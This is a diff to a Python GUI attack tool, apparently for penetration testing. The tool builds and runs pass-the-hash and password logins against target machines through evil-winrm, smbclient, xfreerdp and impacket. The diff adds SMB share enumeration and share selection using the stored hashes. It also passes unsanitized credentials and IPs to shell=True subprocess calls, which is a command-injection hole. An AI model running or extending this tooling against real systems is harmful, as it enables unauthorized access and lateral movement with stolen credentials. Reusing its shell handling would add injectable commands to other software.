@@ -254,14 +254,14 @@ class TitanGUI:
         tk.Button(strike_frame, text="☢ EXECUTE ALL-TOOL TEST ☢", command=self.test_all_tools, 
                   bg="#D35400", fg="white", font=("Courier", 10, "bold"), height=2).pack(fill="x", padx=100, pady=10)
 
-    def get_cmd(self, tool, target_ip, user, secret, c_type):
+    def get_cmd(self, tool, target_ip, user, secret, c_type, smb_share="C$"):
         impacket_secret = f"aad3b435b51404eeaad3b435b51404ee:{secret}" if c_type == "hash" else secret
         
         if tool == "Evil-WinRM": 
             return f"evil-winrm -i {target_ip} -u '{user}' " + (f"-H {secret}" if c_type == "hash" else f"-p '{secret}'")
         
         elif tool == "SMBClient": 
-            return f"smbclient //{target_ip}/C$ -U '{user}'" + (f" --pw-nt-hash {secret}" if c_type == "hash" else f"%'{secret}'") + " -c 'ls'"
+            return f"smbclient //{target_ip}/{smb_share} -U '{user}'" + (f" --pw-nt-hash {secret}" if c_type == "hash" else f"%'{secret}'") + " -c 'ls'"
 
         elif tool == "SSH":
             if c_type == "hash":
@@ -287,6 +287,46 @@ class TitanGUI:
             return f"xfreerdp3 /v:{target_ip} /u:'{user}' " + (f"/pth:{secret}" if c_type == "hash" else f"/p:'{secret}'") + " /cert:ignore +auth-only"
         
         return ""
+
+    def get_smb_shares(self, target_ip, user, secret, c_type):
+        list_cmd = f"smbclient -g -L //{target_ip} -U '{user}'"
+        if c_type == "hash":
+            list_cmd += f" --pw-nt-hash {secret}"
+        else:
+            list_cmd += f"%'{secret}'"
+
+        result = subprocess.run(list_cmd, shell=True, capture_output=True, text=True)
+        if result.returncode != 0:
+            return []
+
+        shares = []
+        for line in result.stdout.splitlines():
+            parts = line.split("|")
+            if len(parts) < 3:
+                continue
+            record_type, share_name, share_kind = parts[0], parts[1], parts[2]
+            if record_type.lower() != "disk" or share_kind.lower() != "disk":
+                continue
+            if share_name not in shares:
+                shares.append(share_name)
+        return shares
+
+    def choose_smb_share(self, shares):
+        if not shares:
+            messagebox.showwarning("SMB Shares", "No SMB disk shares were discovered for this target.")
+            return None
+
+        prompt = "Available shares:\n" + "\n".join(f"- {name}" for name in shares)
+        prompt += "\n\nEnter the share name you would like to connect to:"
+        choice = simpledialog.askstring("Select SMB Share", prompt, parent=self.root)
+        if not choice:
+            return None
+
+        choice = choice.strip()
+        if choice not in shares:
+            messagebox.showerror("Invalid Share", f"'{choice}' is not in the discovered share list.")
+            return None
+        return choice
 
     def test_all_tools(self):
         target_ip = self.target_cb.get()
@@ -498,7 +538,15 @@ class TitanGUI:
         if idx == -1 or target_ip == "-- SELECT TARGET --": return
         cred = self.data[target_ip]['creds'][idx]
         
-        cmd = self.get_cmd(tool, target_ip, cred['user'], cred['secret'], cred['type'])
+        smb_share = "C$"
+        if tool == "SMBClient":
+            shares = self.get_smb_shares(target_ip, cred['user'], cred['secret'], cred['type'])
+            smb_share = self.choose_smb_share(shares)
+            if not smb_share:
+                return
+            self.log_event(f"SMB SHARE SELECTED: {smb_share} on {target_ip}")
+
+        cmd = self.get_cmd(tool, target_ip, cred['user'], cred['secret'], cred['type'], smb_share=smb_share)
         
         if cmd:
             # Strip test flags if present
